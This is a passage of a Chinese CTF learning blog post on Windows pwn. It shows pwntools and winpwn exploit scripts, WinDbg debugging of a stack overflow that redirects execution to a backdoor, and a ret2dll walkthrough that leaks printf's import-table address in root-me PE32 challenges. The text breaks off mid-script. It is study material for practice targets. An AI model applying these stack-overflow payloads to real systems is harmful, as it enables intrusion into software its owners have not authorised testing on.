    <content type="html"><![CDATA[<html><head></head><body><blockquote><p>首发于：<a href="https://xz.aliyun.com/t/11891">先知社区</a></p><p>上一节笔者学习了winpwn的用法，以及最基础的栈溢出利用用法和win pwn的保护机制的意思，这一节笔者学习了利用pwntools编写exp以及调试程序，也学习了ret2dll的利用手法</p></blockquote><p>之前的文章链接：</p><ul><li><a href="https://xz.aliyun.com/t/11865">win pwn初探（一）</a></li></ul><h1 id="win-pwn初探（二）"><a href="#win-pwn初探（二）" class="headerlink" title="win pwn初探（二）"></a>win pwn初探（二）</h1><h2 id="利用pwntools编写exp"><a href="#利用pwntools编写exp" class="headerlink" title="利用pwntools编写exp"></a>利用pwntools编写exp</h2><p>这里需要Ex师傅的一个工具：<a href="https://github.com/Ex-Origin/win_server">Win Server</a>，这个就像搭建pwn题一样，把exe给映射到一个端口上</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/Ex-Origin/win_server.git</span></span><br></pre></td></tr></tbody></table></figure><p>如上git clone之后即可使用，用法：<code>.\win_server.exe ..\ch72\ch72.exe 1234</code>就可以把ch72.exe给映射到1234端口上，试着用nc连接一下，发现可以正常的执行程序</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span>:<span class="number">15</span>:<span class="number">45</span> z1r0@z1r0deMacBook-Pro.local test nc <span class="number">10.211</span><span class="number">.55</span><span class="number">.3</span> <span class="number">1234</span></span><br><span class="line">a</span><br><span class="line">A</span><br></pre></td></tr></tbody></table></figure><p>pwntools如下安装</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></tbody></table></figure><p>接着就可以正常使用pwntools了，需要注意的是目前只支持<code>remote</code>的用法</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">p1 += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(p1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>将上一节的exp改一下之后运行可以正常触发calc</p><h2 id="结合pwntools进行调试"><a href="#结合pwntools进行调试" class="headerlink" title="结合pwntools进行调试"></a>结合pwntools进行调试</h2><p>在调试exp的时候花了很长时间，断点下在了main函数入口那里，以为会直接断在那里的。然后运行的时候发现断不了，就在网上找解决方法（srv，reload），心态快要爆炸后，问了一下Ex师傅，师傅看了一眼就知道问题出在了断点下的太前，已经执行过了，在gets后下了一个断点就成功的断下来了</p><p>首先在exp前面加上一个pause()使得程序停住，如下exp运行</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">p1 += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>然后利用windbg attach到程序上</p><img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/1.png" alt="1" style="zoom: 33%;"><p>在<code>0x0401088</code>这里下一个断点，并且输入g，g就是程序运行到断点停住</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; bp <span class="number">0x0401088</span></span><br><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; g</span><br></pre></td></tr></tbody></table></figure><p>然后回到exp那里输入任意键，执行payload，此时windbg会断到断点这里</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">eax=<span class="number">00000012</span> ebx=<span class="number">00243000</span> ecx=<span class="number">00402732</span> edx=<span class="number">0041b</span>098 esi=<span class="number">0041b</span>e28 edi=<span class="number">0041b</span>e2c</span><br><span class="line">eip=<span class="number">00401088</span> esp=<span class="number">0019f</span>e74 ebp=<span class="number">0019f</span>e90 iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">001b</span>  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003b</span>  gs=<span class="number">0023</span>             efl=<span class="number">00000202</span></span><br><span class="line">ch72+<span class="number">0x1088</span>:</span><br><span class="line"><span class="number">00401088</span> <span class="number">83</span>c408          add     esp,<span class="number">8</span></span><br></pre></td></tr></tbody></table></figure><p>在ebp这里减去0x20就可以看到输入了a（0x61）被转换成大写A（0x41），并且后面可以看到ebp被覆盖成了aaaa而返回地址被覆盖成了<code>0x00401000</code>这个地址也就是后门地址</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc ebp - <span class="number">0x20</span></span><br><span class="line"><span class="number">0019f</span>e70  <span class="number">00401088</span> <span class="number">0041b</span>01c <span class="number">0019f</span>e7c <span class="number">41414141</span>  ..@...A.|...AAAA</span><br><span class="line"><span class="number">0019f</span>e80  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">00000010</span>  AAAAAAAAAAAA....</span><br><span class="line"><span class="number">0019f</span>e90  <span class="number">61616161</span> <span class="number">00401000</span> <span class="number">00000000</span> <span class="number">06e29668</span>  aaaa..@.....h...</span><br><span class="line"><span class="number">0019f</span>ea0  <span class="number">06e29690</span> <span class="number">8</span>abb39fd <span class="number">00401347</span> <span class="number">00243000</span>  ....<span class="number">.9</span>..G.@.<span class="number">.0</span>$.</span><br><span class="line"><span class="number">0019f</span>eb0  <span class="number">00243000</span> <span class="number">00000000</span> <span class="number">00401347</span> <span class="number">00243000</span>  <span class="number">.0</span>$.....G.@.<span class="number">.0</span>$.</span><br><span class="line"><span class="number">0019f</span>ec0  <span class="number">0019f</span>ea4 <span class="number">00000000</span> <span class="number">0019f</span>ef8 <span class="number">00401</span>c60  ............`.@.</span><br><span class="line"><span class="number">0019f</span>ed0  <span class="number">8</span>ae3509d <span class="number">00000000</span> <span class="number">0019f</span>ef0 <span class="number">762</span>ec038  .P.........<span class="number">.8</span>..v</span><br><span class="line"><span class="number">0019f</span>ee0  <span class="number">00243000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  <span class="number">.0</span>$.............</span><br></pre></td></tr></tbody></table></figure><p>再次g就可以getshell，也可以单步调试-<code>p</code>，下面是ret之后的，可以看到成功跑进后门里</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00363000</span> ecx=<span class="number">00402732</span> edx=<span class="number">0041b</span>098 esi=<span class="number">0041b</span>e28 edi=<span class="number">0041b</span>e2c</span><br><span class="line">eip=<span class="number">00401000</span> esp=<span class="number">0019f</span>e98 ebp=<span class="number">61616161</span> iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">001b</span>  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003b</span>  gs=<span class="number">0023</span>             efl=<span class="number">00000246</span></span><br><span class="line">ch72+<span class="number">0x1000</span>:</span><br><span class="line"><span class="number">00401000</span> <span class="number">55</span>              push    ebp</span><br></pre></td></tr></tbody></table></figure><h2 id="利用winpwn模块进行调试"><a href="#利用winpwn模块进行调试" class="headerlink" title="利用winpwn模块进行调试"></a>利用winpwn模块进行调试</h2><p>winpwn调试和上面的区别是winpwn可以本地调试（对目前来说），在winpwn的官方文档里要求配置一个.winpwn到<strong>HOMEDIR</strong>这个文件夹里面，不知道homedir是什么就可以用如下python运行一下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.10</span><span class="number">.8</span> (tags/v3<span class="number">.10</span><span class="number">.8</span>:aaaf517, Oct <span class="number">11</span> <span class="number">2022</span>, <span class="number">16</span>:<span class="number">50</span>:<span class="number">30</span>) [MSC v<span class="number">.1933</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.path.expanduser(<span class="string">"~\\.winpwn"</span>)</span><br><span class="line"><span class="string">'C:\\Users\\MAC\\.winpwn'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></tbody></table></figure><p>然后写入如下配置</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"debugger"</span>:{</span><br><span class="line">        <span class="string">"i386"</span>: {</span><br><span class="line">            <span class="string">"x64dbg"</span>: <span class="string">"F:\\ctfTools\\debugTools\\x64debug\\release\\x32\\x32dbg.exe"</span>, </span><br><span class="line">            <span class="string">"gdb"</span>: <span class="string">"F:\\ctfTools\\windows-gdb\\mingw-w64-686\\mingw32\\bin\\gdb.exe"</span>, </span><br><span class="line">            <span class="string">"windbg"</span>: <span class="string">"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe"</span>,</span><br><span class="line">            <span class="string">"windbgx"</span>: <span class="string">"C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"amd64"</span>: {</span><br><span class="line">            <span class="string">"x64dbg"</span>: <span class="string">"F:\\ctfTools\\debugTools\\x64debug\\release\\x64\\x64dbg.exe"</span>, </span><br><span class="line">            <span class="string">"gdb"</span>: <span class="string">"F:\\ctfTools\\windows-gdb\\mingw-w64-64\\mingw64\\bin\\gdb64.exe"</span>, </span><br><span class="line">            <span class="string">"windbg"</span>: <span class="string">"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe"</span>,</span><br><span class="line">            <span class="string">"windbgx"</span>: <span class="string">"C:\\Users\\byzero\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe"</span></span><br><span class="line">        }</span><br><span class="line">    },</span><br><span class="line">    <span class="string">"debugger_init"</span>: {</span><br><span class="line">        <span class="string">"i386"</span>: {</span><br><span class="line">            <span class="string">"x64dbg"</span>: <span class="string">""</span>, </span><br><span class="line">            <span class="string">"gdb"</span>: <span class="string">""</span>, </span><br><span class="line">            <span class="string">"windbg"</span>: <span class="string">".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"</span>,</span><br><span class="line">            <span class="string">"windbgx"</span>: <span class="string">".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x86\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"amd64"</span>: {</span><br><span class="line">            <span class="string">"x64dbg"</span>: <span class="string">""</span>, </span><br><span class="line">            <span class="string">"gdb"</span>: <span class="string">""</span>, </span><br><span class="line">            <span class="string">"windbg"</span>: <span class="string">".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"</span>,</span><br><span class="line">            <span class="string">"windbgx"</span>: <span class="string">".load E:\\ShareDir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g E:\\ShareDir\\building\\bywin\\byinit.py;"</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>目前只需要改第7行的代码，把之前下载的windbg.exe的位置填进去就好了</p><p>然后exp如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ch72.exe'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = process(file_name)</span><br><span class="line"></span><br><span class="line">windbgx.attach(r)</span><br><span class="line">payload  = <span class="string">'a'</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>运行exp时windbg就会自动启动，再像上面pwntools那样下断点即可</p><h2 id="ret2dll"><a href="#ret2dll" class="headerlink" title="ret2dll"></a>ret2dll</h2><p>这个攻击手法和ret2libc相似，用<code>root-me PE32 - Stack buffer overflow avancé</code>这题来学习一下</p><p><a href="https://www.root-me.org/fr/Challenges/App-Systeme/PE32-Stack-buffer-overflow-avance">题目地址</a>，题目源码需要攻击成功之后才可以查看</p><p>在做这个题目前先理解一下什么是dll，DLL的全称是Dynamic Link Library，中文叫做“动态链接文件”，在Windows操作系统中，DLL对于程序执行是非常重要的，因为程序在执行的时候，必须链接到DLL文件，才能够正确地运行。而有些DLL文件可以被许多程序共用。因此, 程序设计人员可以利用DLL文件, 使程序不至于太过巨大。</p><p>这测试一下，写一个test.c</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello wrold"</span>);</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>接着用<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">进程资源管理器</a>这个工具查看test.exe的dll有哪些</p><img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/2.png" alt="1" style="zoom: 33%;"><p>看到了几个经常看见的dll，<code>ntdll.dll</code>, <code>kernel32.dll</code>, <code>KernelBase.dll</code>, <code>ucrtbase.dll</code></p><ul><li>ntdll.dll：ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。是Windows系统从ring3到ring0的入口，位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中</li><li>kernel32.dll：kernel32.dll是非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域</li><li>KernelBase.dll：系统文件kernelbase.dll是存放在Windows系统文件夹中的重要文件，通常情况下是在安装操作系统过程中自动创建的，对于系统正常运行来说至关重要</li><li>ucrtbase.dll：在介绍ucrtbase.dll前先看一下msvcrt.dll是啥，msvcrt.dll是微软在windows操作系统中提供的C语言运行库执行文件（Microsoft Visual C Runtime Library)，其中提供了printf,malloc,strcpy等C语言库函数的具体运行实现，这个和libc.so很像。ucrtbase.dll其实就是把<code>msvcrt.dll</code>拆开了，主要的c运行时的代码放在了<code>ucrtbase.dll</code>中</li></ul><img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/3.png" alt="1" style="zoom: 33%;"><p>整个调用链如上</p><p>现在回到题目，ida反汇编之后如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  FILE *v4; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">fprintf</span>(&amp;__iob[<span class="number">2</span>], <span class="string">"Usage: %s &lt;filename&gt;\n"</span>, *argv);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  v4 = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>);</span><br><span class="line">  manage_file(v4, (<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>会把argv转入的filename通过fopen打开，传入到<code>manage_file</code>函数中，跟进</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall manage_file@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, FILE *Stream, <span class="type">char</span> *FileName)</span><br><span class="line">{</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">8192</span>]; <span class="comment">// [esp+14h] [ebp-a] BYREF</span></span><br><span class="line">  <span class="type">int</span> FileHandle; <span class="comment">// [esp+2014h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> MaxCharCount; <span class="comment">// [esp+2018h] [ebp-10h]</span></span><br><span class="line">  FILE *v11; <span class="comment">// [esp+201Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = alloca(a1);</span><br><span class="line">  <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">  v11 = Stream;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"File name: %s\n"</span>, FileName);</span><br><span class="line">  fseek(Stream, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  MaxCharCount = ftell(Stream);</span><br><span class="line">  rewind(Stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"File size: %d\n"</span>, MaxCharCount);</span><br><span class="line">  FileHandle = open(FileName, <span class="number">0</span>);</span><br><span class="line">  read(FileHandle, DstBuf, MaxCharCount);</span><br><span class="line">  close(FileHandle);</span><br><span class="line">  v4 = count_chars(DstBuf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Alphanumerical chars: %d\n"</span>, v4);</span><br><span class="line">  v5 = count_words(DstBuf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Words: %d\n"</span>, v5);</span><br><span class="line">  v6 = count_lines(DstBuf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Lines: %d\n"</span>, v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"File pointer: %p\n"</span>, v11);</span><br><span class="line">  <span class="keyword">return</span> fclose(v11);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先会输出文件名，接着会把文件大小给输出，然后打开文件通过read将文件里面的内容输入到<code>DstBuf</code>这个变量中，值得注意的是并没有对大小进行限制，导致栈溢出的发生，但是还有一个点是需要注意的，fclose(v11)这个v11直接栈溢出的话会被覆盖掉最后会导致失败，所以需要把v11先给泄露出来然后栈溢出的时候把v11还给覆盖成正常的pointer即可</p><p>所以先随便写一个文件然后运行一下输出一下<code>File pointer</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS ch73&gt; echo a &gt; p1</span><br><span class="line">PS ch73&gt; .\ch73.exe p1</span><br><span class="line">File name: p1</span><br><span class="line">File size: <span class="number">8</span></span><br><span class="line">Alphanumerical chars: <span class="number">1</span></span><br><span class="line">Words: <span class="number">1</span></span><br><span class="line">Lines: <span class="number">0</span></span><br><span class="line">File pointer: <span class="number">75E2</span>D660</span><br></pre></td></tr></tbody></table></figure><p>拿到<code>pointer</code>之后就可以构造第二个payload了，因为这个程序没有system函数，但是我们需要getshell所以不得不寻找system，在glibc pwn中，可以使用ret2libc的攻击手法，在win中通过上面的介绍<code>msvcrt.dll</code>里提供了具体的实现，所以也是有ret2dll的攻击方法，原理和ret2libc差不多</p><p>在win中并没有plt和got表这个概念，但是DLL也用到了类似GOT的方法，称为<strong>导入地址数组</strong>（<strong>Import Address Table，IAT</strong>），IAT和GOT非常类似，IAT中表项对应本模块中用到的外部符号的真实地址，初始为空（也不算为空），在装载后由动态链接器更新为真实地址。在ida中可以看到位于.idata段中</p><img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/4.png" alt="1" style="zoom: 50%;"><p>plt其实可以看成下图的地址</p><img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/5.png" alt="1" style="zoom: 50%;"><p>接下来构造第二个payload，也就是输出printf的真实地址，exp如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0x402974</span></span><br><span class="line">printf_got = <span class="number">0x406200</span></span><br><span class="line"></span><br><span class="line">p1 = p32(<span class="number">0x75E2D660</span>) * <span class="number">2053</span></span><br><span class="line">p1 += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p1 += p32(printf_plt)</span><br><span class="line">p1 += p32(<span class="number">0x004016E3</span>)</span><br><span class="line">p1 += p32(printf_got)</span><br><span class="line"></span><br><span class="line">p1 = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> p1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'./p2'</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(p1))</span><br><span class="line"></span><br><span 